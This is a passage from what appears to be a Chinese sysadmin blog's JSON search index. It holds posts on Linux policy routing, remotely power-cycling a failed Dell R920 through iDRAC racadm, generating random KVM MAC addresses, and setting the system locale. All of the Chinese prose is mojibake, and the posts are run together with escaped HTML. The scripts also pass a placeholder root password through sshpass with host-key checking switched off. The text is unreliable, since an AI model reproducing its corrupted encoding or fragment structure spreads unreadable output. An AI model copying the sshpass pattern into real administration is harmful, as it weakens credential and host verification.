æŸ¥çœ‹ä¸€ä¸‹å°±å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªè¡¨ï¼š\n# ip rule list 0: from all lookup local 32766: from all lookup main 32767: from all lookup default æŸ¥localè¡¨çš„è·¯ç”±è§„åˆ™ï¼š\n# ip route list table local local 10.10.0.1 dev tun0 proto kernel scope host src 10.10.0.1 broadcast 127.255.255.255 dev lo proto kernel scope link src 127.0.0.1 local 192.168.122.1 dev virbr0 proto kernel scope host src 192.168.122.1 local 172.16.8.1 dev br0 proto kernel scope host src 172.16.8.1 broadcast 192.168.122.0 dev virbr0 proto kernel scope link src 192.168.122.1 broadcast 172.16.8.0 dev br0 proto kernel scope link src 172.16.8.1 broadcast 172.16.9.255 dev br0 proto kernel scope link src 172.16.8.1 broadcast 127.0.0.0 dev lo proto kernel scope link src 127.0.0.1 broadcast 192.168.122.255 dev virbr0 proto kernel scope link src 192.168.122.1 local 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1 local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1 ä½¿ç”¨ç­–ç•¥è·¯ç”±çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œ1ã€å®šä¹‰ä¸€ä¸ªè·¯ç”±è¡¨ï¼Œ2ã€å®šä¹‰è·¯ç”±è§„åˆ™ï¼Œ3ã€åº”ç”¨è·¯ç”±è§„åˆ™ã€‚\nä¸€ã€å…ˆå»ºç«‹ä¸€ä¸ªè‡ªå®šä¹‰çš„è·¯ç”±è¡¨ï¼ŒID æ˜¯ 10000 ï¼Œåå­—å«åšmygodï¼ˆæ³¨æ„ï¼ŒIDä»0-32766ä¹‹é—´éšä½ ä¾¿èµ·ï¼Œ3ä¸‡å¤šä¸ªå¯é€‰ï¼‰ï¼š\necho 10000 mygod \u0026gt;\u0026gt; /etc/iproute2/rt_tables äºŒã€å»ºç«‹è·¯ç”±è§„åˆ™\nip rule add from \u0026lt;source address\u0026gt; lookup \u0026lt;table name\u0026gt; å‡è®¾æˆ‘ä»¬æœºå™¨ä¸Šè¿äº†ä¸¤æ¡çº¿è·¯ï¼Œä¸¤å—ç½‘å¡ï¼Œåˆ†é…äº†2ä¸ªipï¼Œç¬¬ä¸€ä¸ªçº¿è·¯æ˜¯eth0ï¼Œipæ˜¯192.168.1.1ï¼Œç¬¬äºŒä¸ªçº¿è·¯æ˜¯eth1ï¼Œipæ˜¯192.168.2.1ã€‚æˆ‘ä»¬æ·»åŠ ä¸€ä¸‹ç­–ç•¥è·¯ç”±è§„åˆ™ï¼Œä»192.168.2.1è¿‡æ¥çš„èµ°mygodè§„åˆ™ã€‚\nip rule add from 192.168.2.1 lookup mygod ä¸‰ã€åº”ç”¨è·¯ç”±è§„åˆ™\nip route add default via 192.168.2.1 dev eth1 table mygod æ³¨æ„ï¼Œè¿™é‡Œæ˜¯åº”ç”¨äº†ç¼ºçœè·¯ç”±ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥å¼„å…¶ä»–çš„ã€‚æ¯”å¦‚ï¼Œä¸€å°æœºå™¨ä¸€ä¸ªç½‘å¡ï¼ŒNä¸ªIPï¼Œæ¯ä¸ªipå¯¹åº”ä¸åŒçš„ä¸“çº¿ã€‚ä½ å°±å¯ä»¥æ·»åŠ ä¸åŒçš„éç¼ºçœè·¯ç”±ã€‚å¦å¤–ï¼Œä¹Ÿæ˜¯æ”¯æŒvlançš„ã€‚\nip route add default via 192.168.2.1 dev eth0.30 table vlan30 å¦‚æœæƒ³æŠŠç­–ç•¥è·¯ç”±å›ºå®šä¸‹æ¥ï¼Œä¸ç”¨æ¯æ¬¡éƒ½æ‰§è¡Œshellè„šæœ¬ï¼Œç”Ÿæˆä¸‹é¢ä¸¤ä¸ªæ–‡ä»¶ï¼š\n# vi /etc/sysconfig/network-scripts/route-eth1 192.168.2.0/24 dev eth1 table mygod default via 192.168.2.1 dev eth1 table mygod # vi /etc/sysconfig/network-scripts/rule-eth1 from 192.168.2.0/24 lookup mygod ","permalink":"https://rendoumi.com/posts/20240110-route_policy/","summary":"\u003cp\u003eå¦‚æœæˆ‘ä»¬æœ‰ä¸¤æ¡ä¸Šç½‘çº¿è·¯å¯ä»¥ä½¿ç”¨ï¼Œé‚£ä¹ˆç­–ç•¥è·¯ç”±å°±æ˜¯ä¸ªå¥½çš„é€‰æ‹©äº†ã€‚\u003c/p\u003e\n\u003cp\u003eåŸºæœ¬æ¦‚å¿µï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eç­–ç•¥è·¯ç”±è¡¨ï¼ˆPolicy routing tablesï¼‰: Linux ç¼ºçœæœ‰3ä¸ªè¡¨ï¼Œ  local (ä¸èƒ½æ”¹ä¹Ÿä¸èƒ½åˆ ), main, å’Œ defaultã€‚æ·»åŠ è·¯ç”±çš„æ—¶å€™å¦‚æœä¸æŒ‡å®šï¼Œç¼ºçœæ˜¯æ·»åŠ åˆ°\u003ccode\u003emain\u003c/code\u003eè·¯ç”±è¡¨é‡Œçš„ã€‚\u003c/li\u003e\n\u003cli\u003eç­–ç•¥è·¯ç”±è§„åˆ™ï¼ˆPolicy routing rulesï¼‰: Linux ç¼ºçœä¹Ÿæœ‰ä¸‰å¥—è·¯ç”±è§„åˆ™ï¼Œå¯¹åº”ä¸‰ä¸ªç¼ºçœè·¯ç”±è¡¨ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eæŸ¥çœ‹ä¸€ä¸‹å°±å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªè¡¨ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ip rule list\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e0:    from all lookup \u003cspan class=\"nb\"\u003elocal\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e32766:    from all lookup main  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e32767:    from all lookup default  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæŸ¥localè¡¨çš„è·¯ç”±è§„åˆ™ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ip route list table local\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elocal\u003c/span\u003e 10.10.0.1 dev tun0  proto kernel  scope host  src 10.10.0.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebroadcast 127.255.255.255 dev lo  proto kernel  scope link  src 127.0.0.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elocal\u003c/span\u003e 192.168.122.1 dev virbr0  proto kernel  scope host  src 192.168.122.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elocal\u003c/span\u003e 172.16.8.1 dev br0  proto kernel  scope host  src 172.16.8.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebroadcast 192.168.122.0 dev virbr0  proto kernel  scope link  src 192.168.122.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebroadcast 172.16.8.0 dev br0  proto kernel  scope link  src 172.16.8.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebroadcast 172.16.9.255 dev br0  proto kernel  scope link  src 172.16.8.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebroadcast 127.0.0.0 dev lo  proto kernel  scope link  src 127.0.0.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebroadcast 192.168.122.255 dev virbr0  proto kernel  scope link  src 192.168.122.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elocal\u003c/span\u003e 127.0.0.1 dev lo  proto kernel  scope host  src 127.0.0.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003elocal\u003c/span\u003e 127.0.0.0/8 dev lo  proto kernel  scope host  src 127.0.0.1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä½¿ç”¨ç­–ç•¥è·¯ç”±çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œ1ã€å®šä¹‰ä¸€ä¸ªè·¯ç”±è¡¨ï¼Œ2ã€å®šä¹‰è·¯ç”±è§„åˆ™ï¼Œ3ã€åº”ç”¨è·¯ç”±è§„åˆ™ã€‚\u003c/p\u003e","title":"Linuxä¸‹çš„ç­–ç•¥è·¯ç”±"},{"content":"è®°å½•ä¸€ä¸‹ï¼Œ2016å¹´çš„5æœˆ5æ—¥è¿™å¤©çš„ä¸­åˆã€‚\næ­£åœ¨è·Ÿè€åˆ˜ã€å¤§äº®ã€Goodå®ä¸€èµ·åƒåˆé¥­ï¼Œçªç„¶æ‰‹æœºæ¥åˆ°çŸ­ä¿¡æŠ¥è­¦ï¼Œè¯´æ˜¯ä¸»æ•°æ®åº“Downäº†ã€‚å‡ºå¤§äº‹äº†ï¼ï¼ï¼\nè¿™ä¸ªæ˜¯å¾ˆå¸¸è§çš„åœºæ™¯å§ï¼Œå¦‚ä½•åœ¨è¿™ç§æƒ…å†µä¸‹å¤„ç†æœåŠ¡å™¨æ•…éšœå‘¢ï¼ŸåŸºæœ¬åƒé¥­çš„æ—¶å€™æ˜¯ä¸ä¼šæºå¸¦ç¬”è®°æœ¬çš„ï¼Œæ‰€æœ‰çš„æ“ä½œåªèƒ½åœ¨æ‰‹æœºä¸Šå®Œæˆäº†ã€‚\nå¦‚æœæ˜¯iphoneæ‰‹æœºï¼Œè£…ä¸ŠTermiusï¼›å¦‚æœæ˜¯androidæ‰‹æœºï¼Œè£…ä¸ŠJuicesshã€‚è¿™ä¸¤ä¸ªéƒ½æ˜¯è¿œç¨‹sshè½¯ä»¶ï¼ˆæˆ‘ä»¬çš„æœåŠ¡å™¨éƒ½æ˜¯Linuxï¼Œæ²¡æœ‰Windowsï¼‰ã€‚å¦å¤–å…¬å¸æ˜¯æœ‰openvpnçš„ï¼Œå¿…é¡»é€šè¿‡vpnæ‰èƒ½è¿æ¥åˆ°IDCçš„æœåŠ¡å™¨ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦æ‰‹æœºè£…ä¸Šopenvpnè½¯ä»¶ã€‚\næ‹¨é€švpnï¼Œç”¨sshè¿ä¸ŠæœåŠ¡å™¨ï¼Œç„¶åå¿«é€Ÿè¿è¡Œå®ç°ç¼–å†™å¥½çš„pingè„šæœ¬ï¼š\ncat 1.ping.sh #!/bin/sh ping 172.8.$1 è¿™ä¸ªè„šæœ¬å¾ˆå¥‡æ€ªå§ï¼Œåå­—å«åš1.ping.shï¼Œæ˜¯å› ä¸ºåœ¨æ‰‹æœºä¸Šæ“ä½œï¼Œä¸€åˆ‡éƒ½è¦è¿…é€Ÿï¼ŒTermiuså’ŒJuicesshéƒ½æ˜¯æ”¯æŒå‘½ä»¤è¡¥å…¨çš„{tab}é”®çš„ï¼Œæ‰€ä»¥åªè¦è¾“å…¥./1{tab} 1.1 å°±ç­‰äºæ‰§è¡Œäº†ping 172.8.1.1ï¼Œä¸Šé¢åªè¾“å…¥äº†6ä¸ªå­—ç¬¦ï¼Œè€Œå®Œæ•´çš„pingå‘½ä»¤åˆ™éœ€è¦è¾“å…¥14ä¸ªå­—ç¬¦ï¼Œè¿™å°±æ˜¯åŸå› äº†ã€‚\npingä¸€ä¸‹ä¸é€šï¼Œé‚£å°±èµ¶ç´§æ‰§è¡Œè„šæœ¬ï¼ŒæŠ“ä¸€ä¸‹æœåŠ¡å™¨idracå‰é¢æ¿çš„ä¿¡æ¯ï¼š\ncat 2.idrac.sh #!/bin/sh sshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm get System.LCD.CurrentDisplay ä¸Šé¢è„šæœ¬ç”¨dellçš„radadmæ¥æŠ“å–æœåŠ¡å™¨idracçš„å‰é¢æ¿ä¿¡æ¯ï¼Œidracå’Œç½‘å¡çš„ç½‘æ®µåªæ˜¯å‰é¢ç¬¬ä¸€æ®µä¸åŒï¼Œç½‘å¡æ˜¯172ï¼Œidracæ˜¯10ï¼Œè¿™æ ·å¾ˆæ–¹ä¾¿è®°å¿†ã€‚\nå¾—åˆ°ç»“æœï¼š\nCPU1 has internal error. (IERR) å½»åº•å®Œè›‹ï¼CPUå‡ºé”™äº†ï¼Œæƒ³éƒ½ä¸ç”¨æƒ³ï¼Œç¡¬ä»¶é‡å¯ï¼š\ncat 3.reboot.sh #!/bin/sh\rsshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm serveraction powercycle ä»powercycleåˆ°Centoså®Œå…¨å¯åŠ¨ï¼Œç³»ç»Ÿå¼€å§‹è®°å½•/var/log/messagesï¼Œæ‰€æœ‰æ—¶é—´å…±èŠ±è´¹äº†7åˆ†é’Ÿã€‚\næ³¨æ„ï¼šæœ‰å¯èƒ½åœ¨é‡å¯çš„è¿‡ç¨‹ä¸­éœ€è¦æŒ‰ä¸€ä¸‹F1çš„æŒ‰é’®ç»§ç»­ï¼Œè¿™æ ·å°±éœ€è¦æ‰“å¼€vncï¼ŒæŒ‰é‚£ä¸€ä¸‹å­ï¼Œæˆ–è€…æå‰åœ¨idracé‡Œè®¾ç½®ErrPrompt disabledï¼Œä¸éœ€è¦æŒ‰F1å°±é‡å¯ã€‚\nsshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm set BIOS.MiscSettings.ErrPrompt Disabled æ€»ç»“ï¼šè¿™èµ·æ•…éšœä»æ¥åˆ°æŠ¥è­¦åˆ°æ£€æŸ¥å®Œæ¯•åªèŠ±è´¹äº†3åˆ†é’Ÿï¼Œç„¶åé‡å¯ï¼Œ7åˆ†é’Ÿæœºå™¨ç³»ç»Ÿå¯åŠ¨ï¼Œ2åˆ†é’Ÿoracleå¤‡åº“æ¢å¤ï¼Œ3+7+2=12åˆ†é’Ÿã€‚è¿™çœŸæ˜¯ä¸ªæé™æ—¶é—´äº†ã€‚\nè¿ç»´èƒ½åšåˆ°çš„ä¹Ÿå°±è¿™ä¹ˆå¿«äº†å§ã€‚\n","permalink":"https://rendoumi.com/posts/20240110-dell_restart/","summary":"\u003cp\u003eè®°å½•ä¸€ä¸‹ï¼Œ2016å¹´çš„5æœˆ5æ—¥è¿™å¤©çš„ä¸­åˆã€‚\u003c/p\u003e\n\u003cp\u003eæ­£åœ¨è·Ÿè€åˆ˜ã€å¤§äº®ã€Goodå®ä¸€èµ·åƒåˆé¥­ï¼Œçªç„¶æ‰‹æœºæ¥åˆ°çŸ­ä¿¡æŠ¥è­¦ï¼Œè¯´æ˜¯ä¸»æ•°æ®åº“Downäº†ã€‚å‡ºå¤§äº‹äº†ï¼ï¼ï¼\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªæ˜¯å¾ˆå¸¸è§çš„åœºæ™¯å§ï¼Œå¦‚ä½•åœ¨è¿™ç§æƒ…å†µä¸‹å¤„ç†æœåŠ¡å™¨æ•…éšœå‘¢ï¼ŸåŸºæœ¬åƒé¥­çš„æ—¶å€™æ˜¯ä¸ä¼šæºå¸¦ç¬”è®°æœ¬çš„ï¼Œæ‰€æœ‰çš„æ“ä½œåªèƒ½åœ¨æ‰‹æœºä¸Šå®Œæˆäº†ã€‚\u003c/p\u003e\n\u003cp\u003eå¦‚æœæ˜¯iphoneæ‰‹æœºï¼Œè£…ä¸Š\u003ccode\u003eTermius\u003c/code\u003eï¼›å¦‚æœæ˜¯androidæ‰‹æœºï¼Œè£…ä¸Š\u003ccode\u003eJuicessh\u003c/code\u003eã€‚è¿™ä¸¤ä¸ªéƒ½æ˜¯è¿œç¨‹sshè½¯ä»¶ï¼ˆæˆ‘ä»¬çš„æœåŠ¡å™¨éƒ½æ˜¯Linuxï¼Œæ²¡æœ‰Windowsï¼‰ã€‚å¦å¤–å…¬å¸æ˜¯æœ‰openvpnçš„ï¼Œå¿…é¡»é€šè¿‡vpnæ‰èƒ½è¿æ¥åˆ°IDCçš„æœåŠ¡å™¨ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦æ‰‹æœºè£…ä¸Šopenvpnè½¯ä»¶ã€‚\u003c/p\u003e\n\u003cp\u003eæ‹¨é€švpnï¼Œç”¨sshè¿ä¸ŠæœåŠ¡å™¨ï¼Œç„¶åå¿«é€Ÿè¿è¡Œå®ç°ç¼–å†™å¥½çš„pingè„šæœ¬ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat 1.ping.sh  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!/bin/sh\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eping 172.8.\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™ä¸ªè„šæœ¬å¾ˆå¥‡æ€ªå§ï¼Œåå­—å«åš1.ping.shï¼Œæ˜¯å› ä¸ºåœ¨æ‰‹æœºä¸Šæ“ä½œï¼Œä¸€åˆ‡éƒ½è¦è¿…é€Ÿï¼ŒTermiuså’ŒJuicesshéƒ½æ˜¯æ”¯æŒå‘½ä»¤è¡¥å…¨çš„{tab}é”®çš„ï¼Œæ‰€ä»¥åªè¦è¾“å…¥./1{tab} 1.1 å°±ç­‰äºæ‰§è¡Œäº†ping 172.8.1.1ï¼Œä¸Šé¢åªè¾“å…¥äº†6ä¸ªå­—ç¬¦ï¼Œè€Œå®Œæ•´çš„pingå‘½ä»¤åˆ™éœ€è¦è¾“å…¥14ä¸ªå­—ç¬¦ï¼Œè¿™å°±æ˜¯åŸå› äº†ã€‚\u003c/p\u003e\n\u003cp\u003epingä¸€ä¸‹ä¸é€šï¼Œé‚£å°±èµ¶ç´§æ‰§è¡Œè„šæœ¬ï¼ŒæŠ“ä¸€ä¸‹æœåŠ¡å™¨idracå‰é¢æ¿çš„ä¿¡æ¯ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat 2.idrac.sh  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!/bin/sh\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxx\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@10.8.\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e racadm get System.LCD.CurrentDisplay  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸Šé¢è„šæœ¬ç”¨dellçš„radadmæ¥æŠ“å–æœåŠ¡å™¨idracçš„å‰é¢æ¿ä¿¡æ¯ï¼Œidracå’Œç½‘å¡çš„ç½‘æ®µåªæ˜¯å‰é¢ç¬¬ä¸€æ®µä¸åŒï¼Œç½‘å¡æ˜¯172ï¼Œidracæ˜¯10ï¼Œè¿™æ ·å¾ˆæ–¹ä¾¿è®°å¿†ã€‚\u003c/p\u003e\n\u003cp\u003eå¾—åˆ°ç»“æœï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCPU1 has internal error. \u003cspan class=\"o\"\u003e(\u003c/span\u003eIERR\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå½»åº•å®Œè›‹ï¼CPUå‡ºé”™äº†ï¼Œæƒ³éƒ½ä¸ç”¨æƒ³ï¼Œç¡¬ä»¶é‡å¯ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecat 3.reboot.sh  \r\n#!/bin/sh\r\nsshpass -p \u0026#34;xxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm serveraction powercycle  \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä»powercycleåˆ°Centoså®Œå…¨å¯åŠ¨ï¼Œç³»ç»Ÿå¼€å§‹è®°å½•/var/log/messagesï¼Œæ‰€æœ‰æ—¶é—´å…±èŠ±è´¹äº†7åˆ†é’Ÿã€‚\u003c/p\u003e\n\u003cp\u003eæ³¨æ„ï¼šæœ‰å¯èƒ½åœ¨é‡å¯çš„è¿‡ç¨‹ä¸­éœ€è¦æŒ‰ä¸€ä¸‹F1çš„æŒ‰é’®ç»§ç»­ï¼Œè¿™æ ·å°±éœ€è¦æ‰“å¼€vncï¼ŒæŒ‰é‚£ä¸€ä¸‹å­ï¼Œæˆ–è€…æå‰åœ¨idracé‡Œè®¾ç½®ErrPrompt disabledï¼Œä¸éœ€è¦æŒ‰F1å°±é‡å¯ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxx\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@10.8.\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e racadm \u003cspan class=\"nb\"\u003eset\u003c/span\u003e BIOS.MiscSettings.ErrPrompt Disabled  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ€»ç»“ï¼šè¿™èµ·æ•…éšœä»æ¥åˆ°æŠ¥è­¦åˆ°æ£€æŸ¥å®Œæ¯•åªèŠ±è´¹äº†3åˆ†é’Ÿï¼Œç„¶åé‡å¯ï¼Œ7åˆ†é’Ÿæœºå™¨ç³»ç»Ÿå¯åŠ¨ï¼Œ2åˆ†é’Ÿoracleå¤‡åº“æ¢å¤ï¼Œ3+7+2=12åˆ†é’Ÿã€‚è¿™çœŸæ˜¯ä¸ªæé™æ—¶é—´äº†ã€‚\u003c/p\u003e\n\u003cp\u003eè¿ç»´èƒ½åšåˆ°çš„ä¹Ÿå°±è¿™ä¹ˆå¿«äº†å§ã€‚\u003c/p\u003e","title":"æœåŠ¡å™¨R920çš„ä¸€æ¬¡æ€¥é€Ÿæ•…éšœå¤„ç†"},{"content":"ç”¨bashéšæœºç”Ÿæˆç½‘å¡åœ°å€ï¼š\necho 52:54:$(dd if=/dev/urandom count=1 2\u0026gt;/dev/null | md5sum | sed \u0026#39;s/^\\(..\\)\\(..\\)\\(..\\)\\(..\\).*$/\\1:\\2:\\3:\\4/\u0026#39;) 52:54:f6:65:52:39 å¦ä¸€ç§åšæ³•ï¼š\nopenssl rand -hex 6 | sed \u0026#39;s/\\(..\\)/\\1:/g; s/.$//\u0026#39; ","permalink":"https://rendoumi.com/posts/20240109-kvm_random_mac/","summary":"\u003cp\u003eç”¨bashéšæœºç”Ÿæˆç½‘å¡åœ°å€ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e 52:54:\u003cspan class=\"k\"\u003e$(\u003c/span\u003edd \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/urandom \u003cspan class=\"nv\"\u003ecount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e 2\u0026gt;/dev/null \u003cspan class=\"p\"\u003e|\u003c/span\u003e md5sum \u003cspan class=\"p\"\u003e|\u003c/span\u003e sed \u003cspan class=\"s1\"\u003e\u0026#39;s/^\\(..\\)\\(..\\)\\(..\\)\\(..\\).*$/\\1:\\2:\\3:\\4/\u0026#39;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e52:54:f6:65:52:39  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¦ä¸€ç§åšæ³•ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eopenssl rand -hex \u003cspan class=\"m\"\u003e6\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sed \u003cspan class=\"s1\"\u003e\u0026#39;s/\\(..\\)/\\1:/g; s/.$//\u0026#39;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"KVMä¸­ç½‘å¡åœ°å€éšæœºç”Ÿæˆæ–¹æ³•"},{"content":"vim ç¼–è¾‘æ–‡ä»¶ï¼Œé‡Œé¢æ˜¯æœ‰ä¸­æ–‡çš„ï¼Œå¯æ˜¯ç¯å¢ƒå˜é‡ä¸­LANG=Cï¼Œéå¸¸ä¸ä¾¿å•Šï¼Œç»å¸¸å¾—export LANG=zh_CNæ¥è§£å†³ã€‚æ”¾åœ¨/etc/profileé‡Œä¹Ÿä¸æ˜¯ä¸ªäº‹ã€‚\nä¸€åŠ³æ°¸é€¸çš„æ–¹æ³•ï¼š\n# vi /etc/sysconfig/i18n ------ LANG=\u0026#34;zh_CN.UTF-8\u0026#34; SUPPORTED=\u0026#34;zh_CN.UTF-8:zh_CN:zh:zh_TW.UTF-8:zh_TW:zh:en_US.UTF-8:en_US:en\u0026#34; SYSFONT=\u0026#34;latarcyrheb-sun16\u0026#34; ------ ","permalink":"https://rendoumi.com/posts/20240109-linux_lang/","summary":"\u003cp\u003evim ç¼–è¾‘æ–‡ä»¶ï¼Œé‡Œé¢æ˜¯æœ‰ä¸­æ–‡çš„ï¼Œå¯æ˜¯ç¯å¢ƒå˜é‡ä¸­LANG=Cï¼Œéå¸¸ä¸ä¾¿å•Šï¼Œç»å¸¸å¾—export LANG=zh_CNæ¥è§£å†³ã€‚æ”¾åœ¨/etc/profileé‡Œä¹Ÿä¸æ˜¯ä¸ªäº‹ã€‚\u003c/p\u003e\n\u003cp\u003eä¸€åŠ³æ°¸é€¸çš„æ–¹æ³•ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/sysconfig/i18n\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e------\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eLANG\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;zh_CN.UTF-8\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 